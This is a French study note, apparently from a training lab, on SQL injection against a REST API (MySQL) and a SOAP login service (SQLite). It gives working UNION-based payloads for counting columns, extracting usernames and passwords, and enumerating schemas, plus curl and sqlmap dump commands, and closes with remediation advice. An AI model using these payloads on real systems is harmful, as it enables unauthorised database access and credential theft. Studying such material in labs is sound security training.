---
titre: "SQLI — Repérage & fondamentaux"
tags: [Failles, SQLI]
---

# SQLI — Repérage & fondamentaux

> ⬅ [[SQLI - Index]]

Lié : [[Information Disclosure - Index]] · [[WSDL & SOAP - Index]] · [[00 - Méthodologie & Arsenal]] · [[00 - Méthodologie & Arsenal]]

---

## Principe

Une entrée non assainie injectée dans une requête SQL permet d'en sortir la logique prévue. Vaut pour les **API REST** (paramètre `id`) comme pour les **messages SOAP** (champ `username`).

> 🔑 Le module a montré **2 SGBD** : **MySQL** (API PHP port 3003) et **SQLite** (SOAP Node port 3002). La syntaxe UNION diffère légèrement — voir la cheatsheet.

---

## Méthodo UNION-based (universelle)

1. **Confirmer** — casser la requête : `'`
2. **Compter les colonnes** — `ORDER BY n` OU `UNION SELECT NULL,NULL,...`
3. **Repérer la colonne affichée** — marqueurs `'1','2','3'`
4. **Extraire** — placer la donnée cible dans la bonne colonne

```
' ORDER BY 3-- -
' UNION SELECT NULL,NULL,NULL-- -
' UNION SELECT '1','2','3'-- -
' UNION SELECT username,password,NULL FROM users-- -
```

> Commentaire de fin : `-- -` (espace + tiret obligatoire en MySQL) ou `#`. En SQLite : `-- -` fonctionne.

---

## Cas 1 — SQLi dans une API REST (MySQL, port 3003)

Paramètre `id` réfléchi en JSON. Récupérer un user par un critère non-énumérable (`position=736373`) :
```bash
# curl -G + --data-urlencode = pas de galère d'espaces dans l'URL
curl -G "http://<TARGET>:3003/" \
  --data-urlencode "id=0 UNION ALL SELECT NULL,username,NULL FROM users WHERE position=736373-- -"
```
- `id=0` vide le résultat légitime (seule la ligne UNION remonte).
- La colonne **du milieu** était la colonne réfléchie (confirmé par le CONCAT de sqlmap).

sqlmap (rapide) :
```bash
sqlmap -u "http://<TARGET>:3003/?id=1" --dump -T users
# détecte : MySQL >= 5.0.12, PHP 7.4.3, 3 colonnes
```

---

## Cas 2 — SQLi dans un service SOAP (SQLite, port 3002) — le Skills Assessment

Point d'injection = champ `<username>` de l'opération `Login`. Requête serveur probable :
```sql
SELECT * FROM users WHERE username = '<input>' AND password = '<input>'
```

**Trouver le nombre de colonnes** (le service *hang* ou renvoie une erreur tant que c'est faux) :
```
admin' UNION SELECT NULL-- -                 → SqliteError: ...same number of result columns
admin' UNION SELECT NULL,NULL,NULL,NULL-- -  → même erreur
admin' UNION SELECT NULL,NULL,NULL,NULL,NULL-- -  → ✅ répond ! (5 colonnes)
```

> 🎁 L'erreur `SqliteError: SELECTs to the left and right of UNION do not have the same number of result columns` a **tout donné** : SGBD (SQLite/better-sqlite3), nombre de colonnes à trouver, et le chemin source (`/app/soap-wsdl/app.js:130`).

**Marqueurs → la réponse SOAP mappe chaque colonne à un champ nommé :**
```
admin' UNION SELECT '1','2','3','4','5'-- -
```
```xml
<id>0</id><name>Administrator</name><email>admin@htb.net</email>
<username>admin</username><password>FLAG{1337_SQL_INJECTION_IS_FUN_:)}</password>
```
→ Structure de la table révélée : `id, name, email, username, password`.

> 💡 Twist : le payload final n'avait que des valeurs statiques, mais comme `admin'` a matché la **vraie** ligne admin (partie gauche du UNION), le vrai password a remonté. Version rigoureuse pour cibler explicitement :
> ```
> zzz' UNION SELECT id,name,email,username,password FROM users WHERE username='admin'-- -
> ```

Script d'automatisation complet : [[00 - Méthodologie & Arsenal]].

---

## Énumération si `FROM users` échoue

- **MySQL** : `information_schema`
  ```
  ' UNION SELECT table_name,NULL FROM information_schema.tables-- -
  ' UNION SELECT column_name,NULL FROM information_schema.columns WHERE table_name='users'-- -
  ```
- **SQLite** : `sqlite_master`
  ```
  ' UNION SELECT name,NULL FROM sqlite_master WHERE type='table'-- -
  ' UNION SELECT sql,NULL FROM sqlite_master WHERE name='users'-- -
  ```

---

## ⚠️ Injecter dans du XML (SOAP)

Les caractères `< > &` cassent le XML **avant** d'atteindre le SQL. Les échapper si présents : `&lt;` `&gt;` `&amp;`. Les payloads avec seulement `'` et `-` passent sans souci.

---

## Remédiation

- **Requêtes paramétrées** (prepared statements) — la seule vraie défense.
- Least privilege sur le compte DB.
- Messages d'erreur génériques (ne jamais renvoyer les erreurs SGBD au client !).
